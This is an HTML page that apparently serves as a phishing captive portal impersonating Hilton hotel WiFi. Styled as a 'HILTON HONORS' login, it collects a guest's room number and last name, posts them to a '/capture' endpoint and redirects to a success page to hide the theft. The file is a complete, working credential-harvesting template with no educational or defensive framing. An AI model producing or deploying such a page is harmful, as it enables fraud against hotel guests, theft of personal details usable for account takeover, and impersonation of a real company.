<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Hilton WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#003F87,#1E5AA8);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#003F87;font-size:28px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#003F87}button{width:100%;padding:14px;background:#003F87;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>HILTON HONORS</h1></div><form id="loginForm"><div class="form-group"><label>Room Number</label><input type="text" id="room" required placeholder="1234"></div><div class="form-group"><label>Last Name</label><input type="text" id="lastname" required placeholder="Smith"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const room=document.getElementById('room').value;const lastname=document.getElementById('lastname').value;console.log('[Hilton] Room:',room,'Last Name:',lastname);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Hilton',room:room,lastname:lastname})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
